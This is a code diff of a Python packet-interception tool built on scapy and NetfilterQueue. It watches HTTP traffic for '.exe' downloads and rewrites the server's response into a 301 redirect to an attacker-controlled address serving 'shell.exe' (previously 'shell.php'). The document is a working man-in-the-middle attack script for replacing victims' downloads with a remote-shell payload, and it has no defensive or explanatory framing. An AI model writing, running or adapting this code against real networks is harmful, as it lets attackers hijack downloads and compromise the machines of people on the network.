@@ -36,7 +36,6 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-    # if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
         if scapy_packet[scapy.TCP].dport == 80:
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] .exe Request]")
@@ -45,18 +44,19 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.php\n\n")
-                packet.set_payload(str(modified_packet))
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n")
+                print(scapy_packet.show())
+                # packet.set_payload(bytes(modified_packet))
 
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
 
 
 options = get_arguments()
-print("[+] Initiating DNS Spoofer..")
+print("[+] Initiating HTTP Modifier..")
 print("[+] Setting up NetfilterQueue..")
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(int(options.queue_number), process_packet)
-print("[+] Spoofing DNS of queue number " + str(options.queue_number))
+print("[+] Monitoring for HTTP records in queue number " + str(options.queue_number))
 queue.run()
 
